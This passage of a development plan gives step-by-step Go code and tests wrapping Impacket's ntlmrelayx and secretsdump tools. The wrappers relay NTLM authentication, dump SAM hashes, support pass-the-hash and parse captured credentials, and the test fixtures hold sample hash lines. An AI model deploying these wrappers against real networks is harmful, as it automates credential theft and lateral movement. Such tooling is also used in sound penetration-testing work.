	"errors"
	"testing"
	"time"

	"github.com/oioio-space/oioni/tools/impacket"
)

// Typical ntlmrelayx log lines that should produce NTLMRelayEvents.
var ntlmrelayx_lines = []string{
	"[*] SMBD-Thread-2: Connection from WORKGROUP/Administrator@192.168.1.100",
	"[*] WORKGROUP\\Administrator::192.168.1.100:aabbccdd:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
	"[*] Some other log line",
	"[*] CORP\\jdoe::192.168.1.101:aabbccdd:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
}

func TestNTLMRelay_EventsParsed(t *testing.T) {
	fake := newFakeStarter(t)
	fake.add("relay1", ntlmrelayx_lines)

	imp := impacket.NewWithManager(fake)
	relay, err := imp.NTLMRelay(context.Background(), "relay1", impacket.NTLMRelayConfig{
		Target: "smb://192.168.1.1",
	})
	if err != nil {
		t.Fatalf("NTLMRelay: %v", err)
	}

	var events []impacket.NTLMRelayEvent
	for e := range relay.Events() {
		events = append(events, e)
	}

	if len(events) != 2 {
		t.Fatalf("got %d events, want 2; events=%v", len(events), events)
	}
	if events[0].Username != "Administrator" || events[0].Domain != "WORKGROUP" {
		t.Errorf("event[0] = %+v", events[0])
	}
	if events[1].Username != "jdoe" || events[1].Domain != "CORP" {
		t.Errorf("event[1] = %+v", events[1])
	}
	if err := relay.Err(); err != nil {
		t.Fatalf("Err() after exit: %v", err)
	}
}

func TestNTLMRelay_ErrAfterExit(t *testing.T) {
	// fakeProcess with a non-nil wait error simulates a crash.
	proc, complete := fakeProcess([]string{"[*] crash log"}, errors.New("exit status 1"))

	var fakeMgr fakeStarterWithProc
	fakeMgr.proc = proc

	imp := impacket.NewWithManager(&fakeMgr)
	relay, err := imp.NTLMRelay(context.Background(), "x", impacket.NTLMRelayConfig{Target: "smb://1.2.3.4"})
	if err != nil {
		t.Fatal(err)
	}

	complete()
	// Drain events
	for range relay.Events() {}

	if relay.Err() == nil {
		t.Fatal("want non-nil Err() after crash, got nil")
	}
}

func TestNTLMRelay_StopStopsEvents(t *testing.T) {
	proc, complete := fakeProcess([]string{"line1", "line2"}, nil)
	var fakeMgr fakeStarterWithProc
	fakeMgr.proc = proc
	fakeMgr.stopFn = func() { complete() }

	imp := impacket.NewWithManager(&fakeMgr)
	relay, err := imp.NTLMRelay(context.Background(), "x", impacket.NTLMRelayConfig{Target: "smb://1.2.3.4"})
	if err != nil {
		t.Fatal(err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := relay.Stop(ctx); err != nil {
		t.Fatalf("Stop: %v", err)
	}
	// Events channel should be closed
	for range relay.Events() {}
}

// fakeStarterWithProc is a ProcessStarter that returns a pre-built *Process.
type fakeStarterWithProc struct {
	proc   *containers.Process // set before Start() is called
	stopFn func()
}

func (f *fakeStarterWithProc) Start(_ context.Context, _, _ string, _ []string) (*containers.Process, error) {
	return f.proc, nil
}
func (f *fakeStarterWithProc) Stop(_ context.Context, _ string) error {
	if f.stopFn != nil {
		f.stopFn()
	}
	return nil
}
func (f *fakeStarterWithProc) Kill(_ string) error { return nil }
```

- [ ] **Step 2: Run — expect compile failure**

Run: `cd tools && go test ./impacket/ -run TestNTLMRelay -v`
Expected: FAIL — types undefined.

- [ ] **Step 3: Implement `ntlmrelayx.go`**

```go
// tools/impacket/ntlmrelayx.go
package impacket

import (
	"context"
	"regexp"
	"sync"

	"github.com/oioio-space/oioni/tools/containers"
)

// NTLMRelayConfig configures ntlmrelayx.py.
type NTLMRelayConfig struct {
	Target      string // relay target, e.g. "smb://192.168.1.1"
	SMB2Support bool   // pass -smb2support
	OutputFile  string // pass -of <file>; optional
}

// NTLMRelayEvent holds a single parsed relay capture.
type NTLMRelayEvent struct {
	Username string
	Domain   string
	Hash     string // NTLMv2 hash blob
	Target   string // relay target
}

// NTLMRelayProcess wraps the underlying container process with a parsed event stream.
// Does NOT embed *containers.Process to avoid ambiguous Kill()/Wait() methods.
type NTLMRelayProcess struct {
	proc   *containers.Process
	mgr    ProcessStarter
	name   string
	events chan NTLMRelayEvent

	mu  sync.Mutex
	err error
}

// Process returns the underlying container process for Wait()/Running()/Lines() access.
func (p *NTLMRelayProcess) Process() *containers.Process { return p.proc }

// Events returns a buffered channel (capacity 16) of parsed NTLMRelayEvent values.
// Closed when the process exits (under p.mu).
func (p *NTLMRelayProcess) Events() <-chan NTLMRelayEvent { return p.events }

// Err returns the exit error, if any. Safe for concurrent use.
// Returns nil while the process is running. Call after Events() is closed.
func (p *NTLMRelayProcess) Err() error {
	p.mu.Lock()
	defer p.mu.Unlock()
	return p.err
}

// Stop terminates the ntlmrelayx daemon gracefully and waits for exit.
func (p *NTLMRelayProcess) Stop(ctx context.Context) error {
	return p.mgr.Stop(ctx, p.name)
}

// Kill sends SIGKILL immediately. Deregistration is asynchronous.
func (p *NTLMRelayProcess) Kill() error {
	return p.mgr.Kill(p.name)
}

// ntlmHashRe matches lines like:
//   DOMAIN\user::TARGET:challenge:nthash
// emitted by ntlmrelayx when it captures a hash.
var ntlmHashRe = regexp.MustCompile(`^\[.*?\]\s+(\w+)\\(\w+)::[\w.]+:([0-9a-fA-F:]+)$`)

// NTLMRelay starts ntlmrelayx as a background daemon. name must be unique.
func (i *Impacket) NTLMRelay(ctx context.Context, name string, cfg NTLMRelayConfig) (*NTLMRelayProcess, error) {
	args := ntlmRelayArgs(cfg)
	proc, err := i.mgr.Start(ctx, name, "ntlmrelayx.py", args)
	if err != nil {
		return nil, err
	}

	rp := &NTLMRelayProcess{
		proc:   proc,
		mgr:    i.mgr,
		name:   name,
		events: make(chan NTLMRelayEvent, 16),
	}

	// Parsing goroutine: read Lines(), emit events, store exit error.
	go func() {
		var exitErr error
		for line := range proc.Lines() {
			if e, ok := parseNTLMRelayLine(line, cfg.Target); ok {
				select {
				case rp.events <- e:
				default: // drop on full
				}
			}
		}
		exitErr = proc.Wait()
		// Exact ordering: lock → set err → close channel → unlock
		rp.mu.Lock()
		rp.err = exitErr
		close(rp.events)
		rp.mu.Unlock()
	}()

	return rp, nil
}

func ntlmRelayArgs(cfg NTLMRelayConfig) []string {
	args := []string{"-t", cfg.Target}
	if cfg.SMB2Support {
		args = append(args, "-smb2support")
	}
	if cfg.OutputFile != "" {
		args = append(args, "-of", cfg.OutputFile)
	}
	return args
}

func parseNTLMRelayLine(line, target string) (NTLMRelayEvent, bool) {
	m := ntlmHashRe.FindStringSubmatch(line)
	if m == nil {
		return NTLMRelayEvent{}, false
	}
	return NTLMRelayEvent{
		Domain:   m[1],
		Username: m[2],
		Hash:     m[3],
		Target:   target,
	}, true
}
```

- [ ] **Step 4: Run tests — expect pass**

Run: `cd tools && go test ./impacket/ -run TestNTLMRelay -v -race`
Expected: PASS. (If regex doesn't match test lines, adjust `ntlmHashRe` until it does.)

- [ ] **Step 5: Commit**

```bash
git add tools/impacket/ntlmrelayx.go tools/impacket/ntlmrelayx_test.go
git commit -m "feat(tools/impacket): add NTLMRelay wrapper with event parsing"
```

---

### Task 9: `SecretsDump` wrapper

**Files:**
- Create: `tools/impacket/secretsdump.go`
- Create: `tools/impacket/secretsdump_test.go`

- [ ] **Step 1: Write failing tests**

```go
// tools/impacket/secretsdump_test.go
package impacket_test

import (
	"context"
	"testing"

	"github.com/oioio-space/oioni/tools/impacket"
)

var secretsdump_output = []string{
	"[*] Target: 192.168.1.1",
	"[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)",
	"Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
	"Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
	"[*] Cleaning up...",
}

func TestSecretsDump_ParsesCredentials(t *testing.T) {
	fake := newFakeStarter(t)
	fake.add("dump1", secretsdump_output)

	imp := impacket.NewWithManager(fake)
	creds, err := imp.SecretsDump(context.Background(), "dump1", impacket.SecretsDumpConfig{
		Target:   "192.168.1.1",
		Username: "Administrator",
		Password: "Password1",
	})
	if err != nil {
		t.Fatalf("SecretsDump: %v", err)
	}
	if len(creds) != 2 {
		t.Fatalf("got %d creds, want 2; creds=%v", len(creds), creds)
	}
	if creds[0].Username != "Administrator" {
		t.Errorf("creds[0] = %+v", creds[0])
	}
	if creds[0].Type != "NTLM" {
		t.Errorf("creds[0].Type = %q, want NTLM", creds[0].Type)
	}
}

func TestSecretsDump_ContextCancellation(t *testing.T) {
	// Fake that blocks — simulates a long-running secretsdump.
	proc, complete := fakeProcess([]string{}, nil)
	var mgr fakeStarterWithProc
	mgr.proc = proc
	mgr.stopFn = complete

	imp := impacket.NewWithManager(&mgr)
	ctx, cancel := context.WithCancel(context.Background())
	cancel() // cancel immediately

	_, err := imp.SecretsDump(ctx, "dump2", impacket.SecretsDumpConfig{Target: "1.2.3.4"})
	if err == nil {
		t.Fatal("want error on cancelled context, got nil")
	}
}
```

- [ ] **Step 2: Run — expect compile failure**

Run: `cd tools && go test ./impacket/ -run TestSecretsDump -v`
Expected: FAIL — types undefined.

- [ ] **Step 3: Implement `secretsdump.go`**

```go
// tools/impacket/secretsdump.go
package impacket

import (
	"context"
	"errors"
	"regexp"
	"strconv"
	"time"
)

// SecretsDumpConfig configures a secretsdump.py invocation.
type SecretsDumpConfig struct {
	Target   string // host IP or hostname
	Username string
	Password string // one of Password or Hash required
	Hash     string // pass-the-hash, format "LMHASH:NTHASH"
	Domain   string // optional; defaults to target hostname
}

// Credential is a single credential extracted by secretsdump.
type Credential struct {
	Username string
	Domain   string
	Hash     string
	Type     string // "NTLM", "Kerberos", "Plaintext"
}

// samHashRe matches SAM hash dump lines:
//   username:RID:lmhash:nthash:::
var samHashRe = regexp.MustCompile(`^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::`)

type dumpResult struct {
	creds []Credential
	err   error
}

// SecretsDump runs secretsdump.py and returns parsed credentials.
// name must be unique among currently running procs.
// Respects ctx cancellation; always deregisters the process name before returning.
func (i *Impacket) SecretsDump(ctx context.Context, name string, cfg SecretsDumpConfig) ([]Credential, error) {
	proc, err := i.mgr.Start(ctx, name, "secretsdump.py", secretsDumpArgs(cfg))
	if err != nil {
		return nil, err
	}

	// Capacity 1 is load-bearing: prevents goroutine leak on cancellation path.
	done := make(chan dumpResult, 1)
	go func() {
		var creds []Credential
		for line := range proc.Lines() {
			if c, ok := parseSecretsDumpLine(line); ok {
				creds = append(creds, c)
			}
		}
		// r.err holds parse errors only (always nil today; field exists for future use).
		// proc.Wait() is called in the select arm to avoid calling it twice and producing
		// a doubled error string (sync.Once returns the same error on both calls).
		done <- dumpResult{creds, nil}
	}()

	select {
	case r := <-done:
		// errors.Join(r.err, proc.Wait()): surfaces parse errors AND non-zero exit status.
		// Returns nil only when both are nil.
		return r.creds, errors.Join(r.err, proc.Wait())

	case <-ctx.Done():
		// Kill async; ignore error (if process already gone, Lines() is already closed).
		_ = i.mgr.Kill(name)
		// Wait up to 5 s for goroutine to finish.
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			return nil, errors.Join(ctx.Err(),
				errors.New("secretsdump: process did not exit within 5s after kill"))
		}
		return nil, ctx.Err()
	}
}

func secretsDumpArgs(cfg SecretsDumpConfig) []string {
	domain := cfg.Domain
	if domain == "" {
		domain = cfg.Target
	}
	target := cfg.Username + "@" + cfg.Target
	if domain != cfg.Target {
		target = domain + "/" + cfg.Username + "@" + cfg.Target
	}
	args := []string{target}
	if cfg.Hash != "" {
		args = append(args, "-hashes", cfg.Hash)
	} else {
		args = append(args, "-p", cfg.Password)
	}
	return args
}

func parseSecretsDumpLine(line string) (Credential, bool) {
	m := samHashRe.FindStringSubmatch(line)
	if m == nil {
		return Credential{}, false
	}
	// Validate RID is numeric (already guaranteed by regex \d+).
	if _, err := strconv.Atoi(m[2]); err != nil {
		return Credential{}, false
	}
	return Credential{
		Username: m[1],
		Hash:     m[3] + ":" + m[4],
		Type:     "NTLM",
	}, true
}
```

- [ ] **Step 4: Run tests — expect pass**

Run: `cd tools && go test ./impacket/ -run TestSecretsDump -v -race`
Expected: PASS.

- [ ] **Step 5: Run full test suite**

Run: `cd tools && go test ./... -v -race`
Expected: all PASS, no race detected.

- [ ] **Step 6: Vet**

Run: `cd tools && go vet ./...`
Expected: no output.

- [ ] **Step 7: Commit**

```bash
git add tools/impacket/secretsdump.go tools/impacket/secretsdump_test.go
git commit -m "feat(tools/impacket): add SecretsDump wrapper with credential parsing"
```

---

## Final step: wire go.work.sum

- [ ] **Step 1: Sync workspace**

Run: `go work sync`
Expected: no error. `go.work.sum` updated.

- [ ] **Step 2: Commit**

```bash
git add go.work go.work.sum
git commit -m "chore: add tools module to go.work"
```
